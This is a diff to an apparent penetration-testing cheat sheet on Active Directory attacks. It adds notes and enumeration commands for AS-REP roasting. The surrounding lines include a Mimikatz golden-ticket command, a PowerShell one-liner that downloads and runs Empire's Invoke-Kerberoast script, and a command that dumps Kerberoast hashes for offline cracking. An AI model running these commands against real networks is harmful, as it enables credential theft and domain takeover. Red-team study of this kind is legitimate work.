@@ -585,3 +585,13 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Using Kerberoast.ps1
   - `iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")`
   - `Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast`
+
+**Priv Esc - Targeted Kerberoasting AS-REPs**
+- If a user's UserAccountControl settigs have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
+- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.
+
+**Enumerating accounts with Kerberos Preauth disabled**
+- Using PowerView (dev)
+  - `Get-DomainUser -PreauthNotRequired -Verbose`
+- Using ActiveDirectory module
+  - `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
